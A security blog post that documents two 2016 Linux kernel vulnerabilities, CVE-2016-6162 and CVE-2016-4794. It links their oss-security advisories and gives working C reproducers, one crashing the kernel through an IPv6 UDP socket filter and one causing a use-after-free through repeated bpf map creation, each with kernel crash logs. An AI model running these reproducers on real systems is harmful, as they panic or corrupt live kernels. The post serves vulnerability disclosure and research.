---
layout: post
title:  "[CVE-2016-4794/6162] Two linux kernel bugs"
date:   2016-07-06 11:00:00 +0800
categories: security linux
---

## CVE-2016-6162

# oss-sec link
[http://www.openwall.com/lists/oss-security/2016/07/05/1](http://www.openwall.com/lists/oss-security/2016/07/05/1)

# Reproducer

{% highlight c %}
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>

#ifndef SYS_mmap
#define SYS_mmap 9
#endif
#ifndef SYS_socket
#define SYS_socket 41
#endif
#ifndef SYS_bind
#define SYS_bind 49
#endif
#ifndef SYS_sendto
#define SYS_sendto 44
#endif
#ifndef SYS_setsockopt
#define SYS_setsockopt 54
#endif
#ifndef SYS_dup
#define SYS_dup 32
#endif
#ifndef SYS_write
#define SYS_write 1
#endif

long r[22];

int main()
{
memset(r, -1, sizeof(r));
r[0] = syscall(SYS_mmap, 0x20000000ul, 0x1e000ul, 0x3ul, 0x32ul,
0xfffffffffffffffful, 0x0ul);
r[1] = syscall(SYS_socket, 0xaul, 0x2ul, 0x0ul, 0, 0, 0);
memcpy((void*)0x20006000,
"\x0a\x00\xab\x12\xc7\x17\x1c\x83\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x4f\xdc\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
128);
r[3] = syscall(SYS_bind, r[1], 0x20006000ul, 0x80ul, 0, 0, 0);
memcpy((void*)0x20017f5a,
"\x25\xf9\x1b\xd4\xeb\xf5\x39\x3c\xd5\x80\xf6\xf0\xd6\xe1\xff\x65\x30\x97\xac\xaf\x1b\xbc\xc8\xae\xa4\x1e\xab\xd8\x60\x51\xcb\x4b\xed\xae\xaa\x37\xda\x80\xf9\x06\xb8\x6b\xdf\xcc\x78\x0f\xd0\x87\xf2\x65\x5f\x5e\x85\xb5\x4d\x6b\x48\xff\xf3\x0d\x46\x1c\xe5\xa4\x48\x38\x78\x18\x71\x9b\x75\xc4\xc9\x77\xf2\xc4\x5f\x88\x8e\xd2\x8d\x97\x26\x56\x4c\x93\x31\xbc\x64\x22\xff\xdc\x68\x01\x74\x43\xea\x84\x6f\x1d\x90\xeb\x98\x6c\xe9\x1c\x3b\x72\xab\xa0\xb5\x5b\xe8\xee\xfb\xf3\x2d\x96\xa0\xd4\x13\x55\xbc\xd4\xe0\x41\xfd\x78\x7e\x90\xf9\x9f\x9c\x57\x32\x47\xf2\xcf\x7f\x4a\x7b\x79\x0a\xdd\xb4\xce\xbd\x0b\x44\x02\x95\x0f\xaf\x50\xff\x87\x90\x09\xaa\x94\x01\x41\x43\x08\x8e\xb1",
166);
memcpy((void*)0x200001a2,
"\x0a\x00\xab\x12\x0d\xf5\xba\x69\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xac\xad\xce\xa0",
28);
r[6] = syscall(SYS_sendto, r[1], 0x20017f5aul, 0xa6ul,
0x249e4e54fe149d8cul, 0x200001a2ul, 0x1cul);
*(uint16_t*)0x2001dff0 = (uint16_t)0x1;
*(uint64_t*)0x2001dff8 = (uint64_t)0x2001d000;
*(uint16_t*)0x2001d000 = (uint16_t)0x6;
*(uint8_t*)0x2001d002 = (uint8_t)0x4e6;
*(uint8_t*)0x2001d003 = (uint8_t)0x0;
*(uint32_t*)0x2001d004 = (uint32_t)0x1;
r[13] = syscall(SYS_setsockopt, r[1], 0x1ul, 0x1aul, 0x2001dff0ul, 0x10ul,
0);
r[14] = syscall(SYS_dup, r[1], 0, 0, 0, 0, 0);
*(uint32_t*)0x20013000 = (uint32_t)0x28;
*(uint32_t*)0x20013004 = (uint32_t)0x2;
*(uint64_t*)0x20013008 = (uint64_t)0x0;
*(uint64_t*)0x20013010 = (uint64_t)0xfffffffffffffff7;
*(uint64_t*)0x20013018 = (uint64_t)0x7;
*(uint16_t*)0x20013020 = (uint16_t)0x1;
r[21] = syscall(SYS_write, r[14], 0x20013000ul, 0x28ul, 0, 0, 0);
return 0;
}
{% endhighlight %}

# kASAN

{% highlight text %}
[   59.831394] kernel BUG at net/core/skbuff.c:3051!
[   59.831802] invalid opcode: 0000 [#1] SMP KASAN
[   59.832193] Modules linked in:
[   59.832488] CPU: 0 PID: 1651 Comm: derp2 Not tainted 4.7.0-rc6 #1
[   59.833022] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   59.833827] task: ffff8800ba26c740 ti: ffff8800b8ba8000 task.ti:
ffff8800b8ba8000
[   59.834498] RIP: 0010:[<ffffffff8292611c>]  [<ffffffff8292611c>]
skb_pull_rcsum+0x1ec/0x2c0
[   59.835238] RSP: 0018:ffff88011b007768  EFLAGS: 00010206
[   59.835705] RAX: ffff8800ba26c740 RBX: ffff880119c338c0 RCX:
ffff880119c33940
[   59.836311] RDX: 0000000000000100 RSI: 0000000000000008 RDI:
ffff880119c33940
[   59.836916] RBP: ffff88011b007798 R08: ffff88011b007700 R09:
0000000000000001
[   59.837521] R10: 1ffff10017742929 R11: ffff880119c33982 R12:
0000000000000001
[   59.838141] R13: 0000000000000008 R14: ffff880119c33998 R15:
ffff8800b88ce490
[   59.838767] FS:  0000000002454880(0000) GS:ffff88011b000000(0000)
knlGS:0000000000000000
[   59.839522] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   59.840017] CR2: 0000000020013000 CR3: 00000000b9940000 CR4:
00000000000006f0
[   59.840631] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
[   59.841242] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
0000000000000400
[   59.841851] Stack:
[   59.842033]  ffff88011b007798 ffff880119c338c0 ffff8800b93d3980
0000000000000000
[   59.842759]  0000000000000000 ffffffff83a8a200 ffff88011b0077f0
ffffffff82c54dba
[   59.843430]  ffff880100000000 0000000000000000 00000001ab123950
ffffffff83a8a200
[   59.844102] Call Trace:
[   59.844317]  <IRQ>
[   59.844495]  [<ffffffff82c54dba>] udpv6_queue_rcv_skb+0x4fa/0x15b0
[   59.845048]  [<ffffffff82c56b36>] __udp6_lib_rcv+0xcc6/0x1d20
[   59.845540]  [<ffffffff82c57bb1>] udpv6_rcv+0x21/0x30
[   59.845975]  [<ffffffff82bf5971>] ip6_input_finish+0x3a1/0x1170
[   59.846510]  [<ffffffff82bf7faa>] ip6_input+0xda/0x1f0
[   59.846950]  [<ffffffff82bf7ed0>] ? ipv6_rcv+0x1790/0x1790
[   59.847418]  [<ffffffff8296ce36>] ? __netif_receive_skb+0x36/0x170
[   59.847944]  [<ffffffff8296d024>] ? netif_receive_skb_internal+0xb4/0x210
[   59.848520]  [<ffffffff82bf53ae>] ip6_rcv_finish+0x11e/0x340
[   59.849002]  [<ffffffff82bf74f0>] ipv6_rcv+0xdb0/0x1790
[   59.849450]  [<ffffffff82bf6740>] ? ip6_input_finish+0x1170/0x1170
[   59.849978]  [<ffffffff811fc519>] ? __enqueue_entity+0x139/0x230
[   59.850517]  [<ffffffff81206100>] ? update_curr+0x150/0x4e0
[   59.850993]  [<ffffffff82bf6740>] ? ip6_input_finish+0x1170/0x1170
[   59.851520]  [<ffffffff8296be64>] __netif_receive_skb_core+0x1754/0x26f0
[   59.852101]  [<ffffffff8296a710>] ? netdev_info+0x120/0x120
[   59.852603]  [<ffffffff8120717b>] ? check_preempt_wakeup+0x50b/0xa70
[   59.853167]  [<ffffffff811e6cd4>] ? check_preempt_curr+0x204/0x350
[   59.853715]  [<ffffffff8296ce2f>] __netif_receive_skb+0x2f/0x170
[   59.854286]  [<ffffffff82971037>] process_backlog+0x197/0x580
[   59.854789]  [<ffffffff8296ea99>] net_rx_action+0x7c9/0xcf0
[   59.855264]  [<ffffffff8296e2d0>] ? sk_busy_loop+0xa00/0xa00
[   59.855760]  [<ffffffff822a8c90>] ? __e1000_maybe_stop_tx+0x200/0x200
[   59.856333]  [<ffffffff82d394d3>] ? __do_softirq+0x403/0x585
[   59.856829]  [<ffffffff82d3929e>] __do_softirq+0x1ce/0x585
[   59.857298]  [<ffffffff82d3800c>] do_softirq_own_stack+0x1c/0x30
[   59.857808]  <EOI>
[   59.857983]  [<ffffffff81172568>] do_softirq.part.19+0x38/0x40
[   59.858535]  [<ffffffff811725ed>] __local_bh_enable_ip+0x7d/0x80
[   59.859048]  [<ffffffff82be694d>] ip6_finish_output2+0x7dd/0x1510
[   59.859568]  [<ffffffff81c3f920>] ? __do_once_done+0x1a0/0x210
[   59.860066]  [<ffffffff82be6170>] ? dst_output+0x80/0x80
[   59.860520]  [<ffffffff8294d670>] ? skb_flow_dissector_init+0x290/0x290
[   59.861082]  [<ffffffff81c31c40>] ? copy_page_from_iter+0xa20/0xa20
[   59.861616]  [<ffffffff815c85a1>] ? memset+0x31/0x40
[   59.862042]  [<ffffffff82bf29f2>] ip6_finish_output+0x302/0x560
[   59.862578]  [<ffffffff82bf4259>] ? __ip6_make_skb+0x1279/0x1bc0
[   59.863127]  [<ffffffff82bf2da3>] ip6_output+0x153/0x390
[   59.863582]  [<ffffffff82bf2c50>] ? ip6_finish_output+0x560/0x560
[   59.864100]  [<ffffffff82bf2fe0>] ? ip6_output+0x390/0x390
[   59.864573]  [<ffffffff82cc3d57>] ip6_local_out+0x87/0xb0
[   59.865036]  [<ffffffff82bf4c2e>] ip6_send_skb+0x8e/0x1b0
[   59.865522]  [<ffffffff82c4decd>] udp_v6_send_skb+0x60d/0x1120
[   59.866021]  [<ffffffff82c4ec08>] udp_v6_push_pending_frames+0x228/0x340
[   59.866643]  [<ffffffff82c4e9e0>] ? udp_v6_send_skb+0x1120/0x1120
[   59.867164]  [<ffffffff82a50d50>] ? ip_reply_glue_bits+0xb0/0xb0
[   59.867677]  [<ffffffff82c5069e>] udpv6_sendmsg+0x189e/0x22e0
[   59.868168]  [<ffffffff82a50d50>] ? ip_reply_glue_bits+0xb0/0xb0
[   59.868693]  [<ffffffff82c4ee00>] ? udp_v6_flush_pending_frames+0xe0/0xe0
[   59.869285]  [<ffffffff813b3ee2>] ? is_ftrace_trampoline+0xc2/0xf0
[   59.869814]  [<ffffffff8109010a>] ? print_context_stack+0x6a/0xf0
[   59.870351]  [<ffffffff814ce4b0>] ? warn_alloc_failed+0x240/0x240
[   59.870883]  [<ffffffff815c2de4>] ? deactivate_slab+0x134/0x3d0
[   59.871387]  [<ffffffff815c1f93>] ? alloc_debug_processing+0x73/0x1b0
[   59.871936]  [<ffffffff82b387bc>] inet_sendmsg+0x24c/0x350
[   59.872405]  [<ffffffff82b38570>] ? inet_recvmsg+0x3d0/0x3d0
[   59.872913]  [<ffffffff829081ff>] sock_sendmsg+0xcf/0x110
[   59.873389]  [<ffffffff82908462>] sock_write_iter+0x222/0x3c0
[   59.873879]  [<ffffffff82908240>] ? sock_sendmsg+0x110/0x110
[   59.874394]  [<ffffffff82c94c07>] ? ip6_datagram_release_cb+0x1e7/0x260
[   59.874969]  [<ffffffff81c2a6cf>] ? iov_iter_init+0xaf/0x1d0
[   59.875453]  [<ffffffff8161d71b>] __vfs_write+0x3cb/0x640
[   59.875915]  [<ffffffff8161d350>] ? default_llseek+0x2c0/0x2c0
[   59.876412]  [<ffffffff81ac3fd7>] ? apparmor_file_permission+0x27/0x30
[   59.876969]  [<ffffffff8162106a>] ? rw_verify_area+0xea/0x2b0
[   59.877460]  [<ffffffff816216b5>] vfs_write+0x175/0x4a0
[   59.877907]  [<ffffffff81624f18>] SyS_write+0xd8/0x1b0
[   59.878364]  [<ffffffff81624e40>] ? SyS_read+0x1b0/0x1b0
[   59.878831]  [<ffffffff811271c9>] ? trace_do_page_fault+0x79/0x240
[   59.879362]  [<ffffffff82d36476>] entry_SYSCALL_64_fastpath+0x1e/0xa8
[   59.879907] Code: fc ff df 48 89 fa 48 c1 ea 03 0f b6 04 02 84 c0 74 08
3c 03 0f 8e ba 00 00 00 80 a3 91 00 00 00 f9 e9 4a ff ff ff e8 b4 fe a4 fe
<0f> 0b e8 ad fe a4 fe 0f 0b e8 a6 fe a4 fe 31 d2 4c 89 ff 44 89
[   59.882261] RIP  [<ffffffff8292611c>] skb_pull_rcsum+0x1ec/0x2c0
[   59.882798]  RSP <ffff88011b007768>
[   59.883143] ---[ end trace d7d3f86c27f0e339 ]---
[   59.883546] Kernel panic - not syncing: Fatal exception in interrupt
[   59.884589] Kernel Offset: disabled
[   59.884906] ---[ end Kernel panic - not syncing: Fatal exception in
interrupt
{% endhighlight %}

## CVE-2016-4794

Note, this bug was already triggered by someone else with syzkaller, they didn't however manually coded the PoC.

# oss-sec link
[http://www.openwall.com/lists/oss-security/2016/05/12/6](http://www.openwall.com/lists/oss-security/2016/05/12/6)

# Reproducer + kASAN

{% highlight c %}
// Linux kernel version: 4.6-rc7 or 4.6-rc6, or linux master (tested
2016/05/12) compiled with KASAN to see the log
// Compile it with gcc -o durr durr.c
// Run it and it will cause the UAF endlessly see qemu logs dmesg/logs
// here there is a example log

/*
[  228.998319]
==================================================================
[  228.999029] BUG: KASAN: use-after-free in
pcpu_extend_area_map+0x111/0x130 at addr ffff88006785d47c
[  228.999833] Read of size 4 by task durr/5570
[  229.000219]
=============================================================================
[  229.000943] BUG kmalloc-192 (Tainted: G    B          ): kasan: bad
access detected
[  229.001619]
-----------------------------------------------------------------------------
[  229.001619]
[  229.002485] INFO: Allocated in 0xbbbbbbbbbbbbbbbb
age=18446720155036662370 cpu=0 pid=0
[  229.003198]  pcpu_mem_zalloc+0x56/0xa0
[  229.003542]  ___slab_alloc.constprop.60+0x3f9/0x440
[  229.003995]  __slab_alloc.constprop.59+0x20/0x40
[  229.004426]  __kmalloc+0x20b/0x240
[  229.004749]  pcpu_mem_zalloc+0x56/0xa0
[  229.005102]  pcpu_create_chunk+0x23/0x490
[  229.005478]  pcpu_alloc+0xa42/0xbc0
[  229.005806]  __alloc_percpu_gfp+0x2c/0x40
[  229.006179]  array_map_alloc+0x52b/0x6e0
[  229.006548]  SyS_bpf+0x6ee/0x1800
[  229.006868]  entry_SYSCALL_64_fastpath+0x1a/0xa4
[  229.007302] INFO: Freed in 0xffffba5f age=18446738129474796130 cpu=0
pid=0
[  229.007934]  kvfree+0x3b/0x60
[  229.008220]  __slab_free+0x1df/0x2e0
[  229.008561]  kfree+0x176/0x190
[  229.008847]  kvfree+0x3b/0x60
[  229.009127]  pcpu_balance_workfn+0x755/0xe10
[  229.009527]  process_one_work+0x882/0x12d0
[  229.009905]  worker_thread+0xe4/0x1300
[  229.010251]  kthread+0x1fb/0x280
[  229.010553]  ret_from_fork+0x22/0x40
[  229.010891] INFO: Slab 0xffffea00019e1700 objects=15 used=9
fp=0xffff88006785d048 flags=0x4000000000004080
[  229.011771] INFO: Object 0xffff88006785d450 @offset=5200
fp=0xbbbbbbbbbbbbbbbb
[  229.011771]
[  229.012562] Redzone ffff88006785d448: 00 00 00 00 00 00 00 00
               ........
[  229.013356] Object ffff88006785d450: bb bb bb bb bb bb bb bb 00 00 00 00
00 00 00 00  ................
[  229.014194] Object ffff88006785d460: 58 d4 3c 6b 00 88 ff ff 00 00 20 00
00 00 20 00  X.<k...... ... .
[  229.015033] Object ffff88006785d470: 00 00 e0 fa ff e8 ff ff 01 00 00 00
00 01 00 00  ................
[  229.015869] Object ffff88006785d480: 08 80 87 65 00 88 ff ff e0 ff ff ff
0f 00 00 00  ...e............
[  229.016702] Object ffff88006785d490: 90 d4 85 67 00 88 ff ff 90 d4 85 67
00 88 ff ff  ...g.......g....
[  229.017534] Object ffff88006785d4a0: e0 8a 49 81 ff ff ff ff a8 52 92 67
00 88 ff ff  ..I......R.g....
[  229.018368] Object ffff88006785d4b0: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.019215] Object ffff88006785d4c0: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.020056] Object ffff88006785d4d0: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.020901] Object ffff88006785d4e0: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.021745] Object ffff88006785d4f0: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.022587] Object ffff88006785d500: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00  ................
[  229.023431] Redzone ffff88006785d510: 00 00 00 00 00 00 00 00
               ........
[  229.024219] Padding ffff88006785d648: 61 ba ff ff 00 00 00 00
               a.......
[  229.025029] CPU: 0 PID: 5570 Comm: durr Tainted: G    B
4.6.0-rc6 #6
[  229.025681] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
Ubuntu-1.8.2-1ubuntu1 04/01/2014
[  229.026532]  0000000000000000 00000000d3335927 ffff880065e1fb08
ffffffff81b25fb3
[  229.027250]  ffff88006785c000 ffff88006785d450 ffff88006cc02a40
ffffea00019e1700
[  229.027968]  ffff880065e1fb38 ffffffff815282c5 ffff88006cc02a40
ffffea00019e1700
[  229.028682] Call Trace:
[  229.028917]  [<ffffffff81b25fb3>] dump_stack+0x83/0xb0
[  229.029389]  [<ffffffff815282c5>] print_trailer+0x115/0x1a0
[  229.029899]  [<ffffffff8152d144>] object_err+0x34/0x40
[  229.030370]  [<ffffffff8152f2e6>] kasan_report_error+0x226/0x550
[  229.030926]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
[  229.031498]  [<ffffffff8152e9ce>] ? kasan_kmalloc+0x5e/0x70
[  229.032008]  [<ffffffff8152f751>] __asan_report_load4_noabort+0x61/0x70
[  229.032612]  [<ffffffff81496bf1>] ? pcpu_extend_area_map+0x111/0x130
[  229.033192]  [<ffffffff81496bf1>] pcpu_extend_area_map+0x111/0x130
[  229.033755]  [<ffffffff81496f77>] ? pcpu_create_chunk+0x367/0x490
[  229.034314]  [<ffffffff8149734c>] pcpu_alloc+0x2ac/0xbc0
[  229.034804]  [<ffffffff814970a0>] ? pcpu_create_chunk+0x490/0x490
[  229.035358]  [<ffffffff8152e955>] ? kasan_unpoison_shadow+0x35/0x50
[  229.035929]  [<ffffffff81499879>] ? kmalloc_order+0x59/0x70
[  229.036438]  [<ffffffff814998b4>] ? kmalloc_order_trace+0x24/0xa0
[  229.036994]  [<ffffffff8152ad9c>] ? __kmalloc+0x1ec/0x240
[  229.037486]  [<ffffffff81497c8c>] __alloc_percpu_gfp+0x2c/0x40
[  229.038018]  [<ffffffff813e832b>] array_map_alloc+0x52b/0x6e0
[  229.038543]  [<ffffffff813d65ce>] SyS_bpf+0x6ee/0x1800
[  229.039017]  [<ffffffff810dc37d>] ? __do_page_fault+0x1cd/0xb50
[  229.039558]  [<ffffffff813d5ee0>] ? bpf_prog_new_fd+0x30/0x30
[  229.040083]  [<ffffffff810dcda9>] ? trace_do_page_fault+0x79/0x240
[  229.040649]  [<ffffffff82ba1932>] entry_SYSCALL_64_fastpath+0x1a/0xa4
[  229.041236] Memory state around the buggy address:
[  229.041678]  ffff88006785d300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
fc fc
[  229.042331]  ffff88006785d380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc
fc fc
[  229.042992] >ffff88006785d400: fc fc fc fc fc fc fc fc fc fc fc fb fb fb
fb fb
[  229.043642]
    ^
[  229.044286]  ffff88006785d480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb
fb fb
[  229.044938]  ffff88006785d500: fb fb fb fc fc fc fc fc fc fc fc fc fc fc
fc fc
[  229.045589]
==================================================================

*/

#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>

#ifndef SYS_mmap
#define SYS_mmap 9
#endif
#ifndef SYS_bpf
#define SYS_bpf 321
#endif

long r[6];

int main(int argc, char **argv)
{
    printf("--beginning of program\n");

    while(1) {

        pid_t pid = fork();

        if (pid == 0)
        {
            // child process
            memset(r, -1, sizeof(r));
            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
0xfffffffffffffffful, 0x0ul);
            *(uint32_t*)0x20006eea = (uint32_t)0x6;
            *(uint32_t*)0x20006eee = (uint32_t)0x4;
            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
            return 0;
        }
        else if (pid > 0)
        {
            // parent process
            memset(r, -1, sizeof(r));
            r[0] = syscall(SYS_mmap, 0x20000000ul, 0xf000ul, 0x3ul, 0x32ul,
0xfffffffffffffffful, 0x0ul);
            *(uint32_t*)0x20006eea = (uint32_t)0x6;
            *(uint32_t*)0x20006eee = (uint32_t)0x4;
            *(uint32_t*)0x20006ef2 = (uint32_t)0x54d1;
            *(uint32_t*)0x20006ef6 = (uint32_t)0xc93;
            r[5] = syscall(SYS_bpf, 0x0ul, 0x20006eeaul, 0x10ul, 0, 0, 0);
            int returnStatus;
            waitpid(pid, &returnStatus, 0);
            printf("collected child\n");

        }
        else
        {
            // fork failed
            printf("fork() failed!\n");
            return 1;
        }
    }

    printf("--end of program--\n");

    return 0;
}
{% endhighlight %}
